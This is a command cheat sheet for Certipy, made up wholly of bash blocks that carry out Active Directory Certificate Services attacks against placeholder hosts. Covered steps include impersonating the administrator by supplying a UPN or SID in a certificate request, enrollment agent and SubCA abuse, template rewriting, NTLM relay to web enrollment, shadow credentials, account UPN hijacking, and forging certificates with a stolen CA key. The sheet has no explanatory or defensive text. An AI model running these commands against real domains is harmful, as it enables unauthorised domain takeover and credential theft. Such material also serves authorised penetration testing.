```bash
python3 -m venv certipy-venv
source certipy-venv/bin/activate
pip3 install --upgrade certipy-ad
certipy --version
certipy -h
```

```bash
export DOMAIN="corp.local"
export USER="username"
export PASS="Password123!"
export HASH="aad3b435b51404eeaad3b435b51404ee:NTLM_HASH"
export DC_IP="10.10.10.10"
export DC_FQDN="dc01.corp.local"
export CA_IP="10.10.10.20"
export CA_FQDN="ca01.corp.local"
export CA_NAME="CORP-CA"
export TEMPLATE="VulnerableTemplate"
export TARGET_USER="administrator"
export TARGET_UPN="administrator@corp.local"
```

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -stdout
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -enabled -stdout
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -vulnerable -stdout
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -enabled -vulnerable -stdout
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -enabled -vulnerable
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -bloodhound
certipy find -u "$USER@$DOMAIN" -hashes "$HASH" -dc-ip "$DC_IP" -enabled -vulnerable -stdout
certipy find -k -no-pass -dc-ip "$DC_IP" -target "$DC_FQDN" -enabled -vulnerable -stdout
```

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -template "$TEMPLATE"
certipy req -u "$USER@$DOMAIN" -hashes "$HASH" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -template "$TEMPLATE"
certipy req -k -no-pass -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -template "$TEMPLATE"
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -template "$TEMPLATE" -key-size 4096
```

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -template "$TEMPLATE" -upn "$TARGET_UPN"
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -template "$TEMPLATE" -dns "$DC_FQDN"
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -template "$TEMPLATE" -upn "$TARGET_UPN" -sid "S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-500"
```

```bash
certipy auth -pfx "$TARGET_USER.pfx" -dc-ip "$DC_IP"
certipy auth -pfx "$TARGET_USER.pfx" -dc-ip "$DC_IP" -domain "$DOMAIN"
certipy auth -pfx "$TARGET_USER.pfx" -dc-ip "$DC_IP" -username "$TARGET_USER" -domain "$DOMAIN"
certipy auth -pfx "$TARGET_USER.pfx" -dc-ip "$DC_IP" -ldap-shell
```

```bash
export KRB5CCNAME="$TARGET_USER.ccache"
klist
certipy find -k -no-pass -dc-ip "$DC_IP" -target "$DC_FQDN" -enabled -vulnerable -stdout
```

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -template "EnrollmentAgent"
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -template "User" -on-behalf-of "$DOMAIN\\$TARGET_USER" -pfx "enrollment_agent.pfx"
certipy auth -pfx "$TARGET_USER.pfx" -dc-ip "$DC_IP"
```

```bash
certipy template -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -template "$TEMPLATE" -save-old
certipy template -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -template "$TEMPLATE" -write-default-configuration
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -template "$TEMPLATE" -upn "$TARGET_UPN"
certipy template -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -template "$TEMPLATE" -configuration "$TEMPLATE.json"
```

```bash
certipy ca -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -add-officer "$USER"
certipy ca -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -enable-template "SubCA"
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -template "SubCA" -upn "$TARGET_UPN"
certipy ca -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -issue-request REQUEST_ID
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -retrieve REQUEST_ID
certipy auth -pfx "$TARGET_USER.pfx" -dc-ip "$DC_IP"
```

```bash
certipy relay -target "http://$CA_FQDN/certsrv/certfnsh.asp" -template "DomainController"
certipy relay -target "http://$CA_FQDN/certsrv/certfnsh.asp" -template "User"
certipy relay -target "https://$CA_FQDN/certsrv/certfnsh.asp" -template "DomainController"
certipy auth -pfx "$DC_FQDN.pfx" -dc-ip "$DC_IP"
```

```bash
certipy shadow auto -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -account "$TARGET_USER"
certipy shadow auto -u "$USER@$DOMAIN" -hashes "$HASH" -dc-ip "$DC_IP" -account "$TARGET_USER"
certipy shadow add -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -account "$TARGET_USER"
certipy shadow list -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -account "$TARGET_USER"
certipy shadow info -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -account "$TARGET_USER" -device-id DEVICE_ID
certipy shadow remove -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -account "$TARGET_USER" -device-id DEVICE_ID
certipy shadow clear -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -account "$TARGET_USER"
```

```bash
certipy account create -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -user "certuser" -pass "CertUser123!"
certipy account read -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -user "$TARGET_USER"
certipy account update -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -user "$TARGET_USER" -upn "$USER@$DOMAIN"
certipy account update -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -user "$TARGET_USER" -dns "$DC_FQDN"
certipy account delete -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -user "certuser"
```

```bash
certipy forge -ca-pfx "ca.pfx" -upn "$TARGET_UPN" -subject "CN=$TARGET_USER,CN=Users,DC=corp,DC=local"
certipy forge -ca-pfx "ca.pfx" -upn "$TARGET_UPN" -sid "S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-500"
certipy forge -ca-pfx "ca.pfx" -dns "$DC_FQDN"
certipy auth -pfx "$TARGET_USER.pfx" -dc-ip "$DC_IP"
```

```bash
certipy cert -pfx "certificate.pfx" -nokey -out "certificate.crt"
certipy cert -pfx "certificate.pfx" -nocert -out "private.key"
certipy cert -pfx "certificate.pfx" -password "PFX_PASSWORD" -out "converted.pfx"
certipy cert -cert "certificate.crt" -key "private.key" -export -out "certificate.pfx"
```

```bash
certipy parse -text "certipy.txt"
certipy parse -json "certipy.json"
```

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -retrieve REQUEST_ID
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -renew -pfx "certificate.pfx"
```

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -enabled -vulnerable -stdout -debug
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -template "$TEMPLATE" -debug
certipy auth -pfx "$TARGET_USER.pfx" -dc-ip "$DC_IP" -debug
```

```bash
sudo ntpdate "$DC_IP"
sudo timedatectl set-ntp false
sudo ntpdate "$DC_IP"
```

```bash
echo "$DC_IP $DC_FQDN ${DC_FQDN%%.*}" | sudo tee -a /etc/hosts
echo "$CA_IP $CA_FQDN ${CA_FQDN%%.*}" | sudo tee -a /etc/hosts
```

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -enabled -vulnerable -stdout
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -target "$CA_FQDN" -ca "$CA_NAME" -template "$TEMPLATE" -upn "$TARGET_UPN"
certipy auth -pfx "$TARGET_USER.pfx" -dc-ip "$DC_IP"
export KRB5CCNAME="$TARGET_USER.ccache"
klist
```
